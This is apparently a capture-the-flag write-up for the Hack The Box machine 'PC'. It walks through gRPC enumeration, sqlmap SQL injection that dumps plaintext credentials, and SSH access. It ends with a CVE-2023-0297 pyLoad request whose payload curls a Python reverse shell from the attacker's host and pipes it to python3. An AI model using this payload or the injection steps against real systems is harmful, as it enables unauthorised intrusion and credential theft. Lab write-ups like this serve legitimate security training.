---
authors:
    - Lukas Daubner
date: 16-01-2024
---

# PC

## Enumeration

### Nmap

`nmap -sV -Pn -p- 10.10.11.214` I had to add `-Pn`  to skip host discovery and `-p-` to scan all ports

```
Starting Nmap 7.93 ( https://nmap.org ) at 2023-08-06 04:09 EDT
Nmap scan report for 10.10.11.214
Host is up (0.039s latency).
Not shown: 65533 filtered tcp ports (no-response)
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
50051/tcp open  unknown
<SKIPPED FINGERPRINT>
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 127.34 seconds
```

### The unknown service

Visiting `http://10.10.11.214:50051/` does yeld some binary data (not HTML). Let's try to extract it. `curl -D - --verbose --http0.9 --output pc.bin  10.10.11.214:50051` It looks like gRPC, and really 50051 is often used for it.

#### grpcurl

Install: `curl -sSL "https://github.com/fullstorydev/grpcurl/releases/download/v1.8.7/grpcurl_1.8.7_linux_x86_64.tar.gz" | sudo tar -xz -C /usr/local/bin`

https://chromium.googlesource.com/external/github.com/grpc/grpc-go/+/HEAD/Documentation/server-reflection-tutorial.md

`grpcurl -plaintext 10.10.11.214:50051 list`

```
SimpleApp
grpc.reflection.v1alpha.ServerReflection
```

This is possible due to server reflection. Then i can list methods of the `SimpleApp`

```
└─$ grpcurl -plaintext 10.10.11.214:50051 list SimpleApp                               
SimpleApp.LoginUser
SimpleApp.RegisterUser
SimpleApp.getInfo
```

I can register:

```
rpcurl -plaintext -format text -d 'username: "razz"; password: "mann"' 10.10.11.214:50051 SimpleApp.RegisterUser
```

Login:

```
└─$ grpcurl -plaintext -format text -d 'username: "razz"; password: "mann"' 10.10.11.214:50051 SimpleApp.LoginUser   
message: "Your id is 236."
```

But get info gives me:

```
└─$ grpcurl -plaintext -format text -d 'id: "236"' 10.10.11.214:50051 SimpleApp.getInfo                             
message: "Authorization Error.Missing 'token' header"
```

Meaning I need to run registration/ogin again, now with `-v` flag to caputure headers Ok, I can get some info

```
┌──(kali㉿kali)-[~]
└─$ grpcurl -plaintext -format text -d 'id: "120"' -H 'token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoicmF6eiIsImV4cCI6MTY5MTMyMjU0MH0.3e1L4e-cHKxbiF0sfFx8msPCKx5_IytcFPuV_t3fcGU' -v   SimpleApp.getInfo

Resolved method descriptor:
rpc getInfo ( .getInfoRequest ) returns ( .getInfoResponse );

Request metadata to send:
token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoicmF6eiIsImV4cCI6MTY5MTMyMjU0MH0.3e1L4e-cHKxbiF0sfFx8msPCKx5_IytcFPuV_t3fcGU

Response headers received:
content-type: application/grpc
grpc-accept-encoding: identity, deflate, gzip

Response contents:
message: "Will update soon."

Response trailers received:
(empty)
Sent 1 request and received 1 response
```

By asking around, I can see that id 1 is admin:

```
└─$ grpcurl -plaintext -format text -d 'id: "1"' -H 'token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoicmF6eiIsImV4cCI6MTY5MTMyMjU0MH0.3e1L4e-cHKxbiF0sfFx8msPCKx5_IytcFPuV_t3fcGU'  10.10.11.214:50051 SimpleApp.getInfo 
message: "The admin is working hard to fix the issues."
```

#### Token

Let's try to crack the token.

`hashcat -a 0 token.jwt /usr/share/wordlists/rockyou.txt` Not working

`john token.jwt -w=/usr/share/wordlists/rockyou.txt --format=HMAC-SHA256` Nope

`hashcat -m 16500 -a 3 -w 2 token.jwt ?a?a?a?a?a ` interrupted

#### grpcui

Install: `curl -sSL "https://github.com/fullstorydev/grpcui/releases/download/v1.3.1/grpcui_1.3.1_linux_x86_64.tar.gz" | sudo tar -xz -C /usr/local/bin`

Now I can combine it with burp, where the grpcui acts as a proxy

### SQL injection of SimpleService

Having captured a `SimpleApp.getInfo ` request, I'll try SQL injection on it..

I save the request to grpcui (proxy) using burp

```
sqlmap -r request -p id
```

It is vulnerable!

```
$sqlmap -r request -p id --dbs -r request -p id --dbs
the back-end DBMS is SQLite
```

```
$ sqlmap -r request -p id --dbs -r request -p id --tables
+----------+
| accounts |
| messages |
+----------+
```

```
$ sqlmap -r request -p id --dbs -r request -p id --columns -T accounts
+----------+------+
| Column   | Type |
+----------+------+
| password | TEXT |
| username | TEXT |
+----------+------+
```

```
$ sqlmap -r request -p id --dbs -r request -p id --columns -T messages
+----------+------+
| Column   | Type |
+----------+------+
| id       | INT  |
| message  | TEXT |
| username | TEXT |
+----------+------+
```

```
$ sqlmap -r request -p id --dbs -r request -p id --dump -T accounts
+------------------------+----------+
| password               | username |
+------------------------+----------+
| admin                  | admin    |
| HereIsYourPassWord1431 | sau      |
| mann                   | razz     |
+------------------------+----------+
```

Let's try ssh `sau:HereIsYourPassWord1431` And that is a user!

## -> Root

Quick scanning for SUIDs gave me `find / -perm -u=s -type f 2>/dev/null`

```
/snap/snapd/17950/usr/lib/snapd/snap-confine
/snap/core20/1778/usr/bin/chfn
/snap/core20/1778/usr/bin/chsh
/snap/core20/1778/usr/bin/gpasswd
/snap/core20/1778/usr/bin/mount
/snap/core20/1778/usr/bin/newgrp
/snap/core20/1778/usr/bin/passwd
/snap/core20/1778/usr/bin/su
/snap/core20/1778/usr/bin/sudo
/snap/core20/1778/usr/bin/umount
/snap/core20/1778/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core20/1778/usr/lib/openssh/ssh-keysign
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/lib/snapd/snap-confine
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/bin/at
/usr/bin/su
/usr/bin/passwd
/usr/bin/chfn
/usr/bin/fusermount
/usr/bin/newgrp
/usr/bin/mount
/usr/bin/chsh
/usr/bin/sudo
/usr/bin/umount
/usr/bin/gpasswd
```

### Linpeas

Linpeas found interesting open ports. Let's see what is there

```
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                                                                         
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:8000          0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:9666            0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -                   
tcp6       0      0 :::50051                :::*                    LISTEN      -
```

```
sau@pc:/tmp/.razzmann$ curl 127.1.0.0:9666
<!doctype html>
<html lang=en>
<title>Redirecting...</title>
<h1>Redirecting...</h1>
<p>You should be redirected automatically to the target URL: <a href="/login?next=http%3A%2F%2F127.1.0.0%3A9666%2F">/login?next=http%3A%2F%2F127.1.0.0%3A9666%2F</a>. If not, click the link.
```

it's a website. Let's forward it to me and access it trugh Burp proxy `ssh -L 9666:10.10.11.214:9666 sau@10.10.11.214`

It's PyLoad. And that is vulnerable.

### PyLoad

There is RCE vulnerablity in PyLoad, allowing me to inport and execute python without authentication. https://github.com/bAuh0lz/CVE-2023-0297_Pre-auth_RCE_in_pyLoad

So, I prepare a reverse shell, which I expose. https://github.com/infodox/python-pty-shells/blob/master/tcp_pty_backconnect.py

and a request, which downloads the exposed reverse shell script and executes it (without touching FS).

```
POST /flash/addcrypted2 HTTP/1.1
Host: localhost:9666
Content-Type: application/x-www-form-urlencoded
Content-Length: 145
jk=pyimport%20os;os.system("curl%2010.10.16.20:8888/python_shell.py%20|%20python3");f=function%20f2(){};&package=xxx&crypted=AAAA&&passwords=aaaa
```

And that gives me root shell.